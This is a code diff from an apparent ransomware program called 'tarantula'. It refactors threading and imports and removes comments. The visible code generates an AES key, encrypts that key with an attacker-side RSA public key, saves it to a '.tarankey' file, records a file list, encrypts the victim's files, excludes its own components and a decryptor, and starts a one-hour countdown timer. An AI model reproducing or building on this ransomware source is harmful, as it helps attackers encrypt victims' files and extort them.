@@ -10,14 +10,10 @@ import datetime
 import json
 from time import sleep
 import os
-from xmlrpc.client import DateTime
-from libs import *
 from libs.crypto import format_public_key, generate_aes_key, rsa_encrypt, aes_encrypt, read_file_list
-from colorama import init, Fore, Back
-from libs.cthread import CThread
+from threading import Thread
 import requests
 from libs.server import *
-init()
 
 end_time = 0
 files_to_exclude = ['tarantula', 'tarantula-decryptor', 'encrypted-key.tarankey', 'file-list.taranfls']
@@ -107,7 +103,6 @@ def encrypt_files():
 
 def main():
     global encryptKey, end_time
-    # generate key (if not already generated)
     if (os.path.exists("encrypted-key.tarankey") == False):
         aesKey = generate_aes_key(32)
         encryptKey = aesKey
@@ -115,7 +110,7 @@ def main():
         encryptedKey = rsa_encrypt(aesKey, serverPublicKey)
         with open("encrypted-key.tarankey", "w") as f:
             f.write(encryptedKey.decode())
-        # save files list
+
         save_files_list()
         encrypt_files()
 
@@ -150,7 +145,7 @@ def main():
         print(message)
         started_time = datetime.datetime.now()
         end_time = started_time + datetime.timedelta(hours=1)
-        CThread(target=calculate_diff_time).start()
+        Thread(target=calculate_diff_time).start()
     else:
         change_console_colors()
         clear_console()
